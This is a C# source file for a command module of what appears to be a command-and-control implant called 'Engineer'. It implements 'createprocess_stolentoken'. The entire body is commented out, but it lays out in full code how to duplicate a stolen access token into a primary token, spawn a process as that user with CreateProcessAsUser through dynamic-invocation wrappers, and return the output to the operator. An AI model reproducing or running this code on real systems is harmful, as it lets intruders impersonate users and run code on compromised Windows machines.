using DynamicEngLoading;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace Engineer.Commands
{
    internal class CreateProcess_StolenToken : EngineerCommand
    {
        public override string Name => "createprocess_stolentoken";

        public override async Task Execute(EngineerTask task)
        {
            //try
            //{
            //    if (!task.Arguments.TryGetValue("/program", out string program))
            //    {
            //        ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults("No program provided", task, EngTaskStatus.FailedWithWarnings, TaskResponseType.String);
            //    }
            //    if (!task.Arguments.TryGetValue("/args", out string args))
            //    {
            //        ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults("No args provided", task, EngTaskStatus.FailedWithWarnings, TaskResponseType.String);
            //    }
            //    if (!task.Arguments.TryGetValue("/index", out string index))
            //    {
            //        ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults("No index provided, please provide the index of the token store entry to use", task, EngTaskStatus.FailedWithWarnings, TaskResponseType.String);
            //    }
            //    bool parsedint = int.TryParse(index, out int indexInt);
            //    if (!parsedint)
            //    {
            //        ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults("Failed to parse index, please provide the index of the token store entry to use", task, EngTaskStatus.FailedWithWarnings, TaskResponseType.String);
            //    }
            //    if (indexInt < 0 || indexInt > token_store.tokenEntries.Count())
            //    {
            //        ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults("Index out of range, please provide the index of the token store entry to use", task, EngTaskStatus.FailedWithWarnings, TaskResponseType.String);
            //    }

            //    //grab the stored token and if it is not a primary token then duplicate it into one 
            //    var htoken = token_store.tokenEntries[indexInt].hToken;
            //    var sa = new h_DynInv.Win32.WinBase._SECURITY_ATTRIBUTES();
            //    if (!h_DynInv_Methods.AdvApi32FuncWrapper.DuplicateTokenEx(htoken, (uint)h_DynInv.Win32.WinNT.ACCESS_MASK.MAXIMUM_ALLOWED, ref sa, h_DynInv.Win32.WinNT._SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation, h_DynInv.Win32.WinNT.TOKEN_TYPE.TokenPrimary, out IntPtr dupedToken))
            //    {
            //        ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults("Failed to duplicate token", task, EngTaskStatus.FailedWithWarnings, TaskResponseType.String);
            //    }

            //    //use the CreateProcessAsUser function to create a new process with the stolen token
            //    h_DynInv.Win32.ProcessThreadsAPI._PROCESS_INFORMATION _PROCESS_INFORMATION = new h_DynInv.Win32.ProcessThreadsAPI._PROCESS_INFORMATION();
            //    h_DynInv.Win32.ProcessThreadsAPI._STARTUPINFO _STARTUPINFO = new h_DynInv.Win32.ProcessThreadsAPI._STARTUPINFO();
            //    h_DynInv.Win32.WinBase._SECURITY_ATTRIBUTES Process_sa = new h_DynInv.Win32.WinBase._SECURITY_ATTRIBUTES();
            //    Process_sa.nLength = Marshal.SizeOf(Process_sa);
            //    Process_sa.bInheritHandle = true;
            //    Process_sa.lpSecurityDescriptor = IntPtr.Zero;
            //    h_DynInv.Win32.WinBase._SECURITY_ATTRIBUTES Thread_sa = new h_DynInv.Win32.WinBase._SECURITY_ATTRIBUTES();
            //    Thread_sa.nLength = Marshal.SizeOf(Thread_sa);
            //    Thread_sa.bInheritHandle = true;
            //    Thread_sa.lpSecurityDescriptor = IntPtr.Zero;

            //    //setup redirection of stdout and stderr
            //    FileDescriptorRedirector fileDescriptorRedirector = new FileDescriptorRedirector();
            //    bool createdRedirectionPipes = fileDescriptorRedirector.RedirectFileDescriptors_External(ref _STARTUPINFO);
            //    if (!createdRedirectionPipes)
            //    {
            //        ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults("Failed to create redirection pipes", task, EngTaskStatus.FailedWithWarnings, TaskResponseType.String);
            //    }
            //    fileDescriptorRedirector.StartReadFromPipe(task);
            //    bool success = h_DynInv_Methods.AdvApi32FuncWrapper.CreateProcessAsUser(dupedToken, program, args, ref Process_sa, ref Thread_sa, true, 0, IntPtr.Zero, null, ref _STARTUPINFO, out _PROCESS_INFORMATION);
            //    if (!success)
            //    {
            //        fileDescriptorRedirector.ResetFileDescriptors();
            //        fileDescriptorRedirector.ReadDescriptorOutput();
            //        uint error = h_DynInv_Methods.Ker32FuncWrapper.GetLastError();
            //        ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults($"Failed to create process as user, error code {error}", task, EngTaskStatus.FailedWithWarnings, TaskResponseType.String);
            //    }
            //    else
            //    {
            //        fileDescriptorRedirector.ResetFileDescriptors();
            //        string output = fileDescriptorRedirector.ReadDescriptorOutput();
            //        ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults(output, task, EngTaskStatus.Complete, TaskResponseType.String);
            //    }

            //}
            //catch (Exception ex)
            //{
            //    Console.WriteLine(ex.Message);
            //    ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults(ex.Message, task, EngTaskStatus.Failed, TaskResponseType.String);
            //}
        }
    }
}
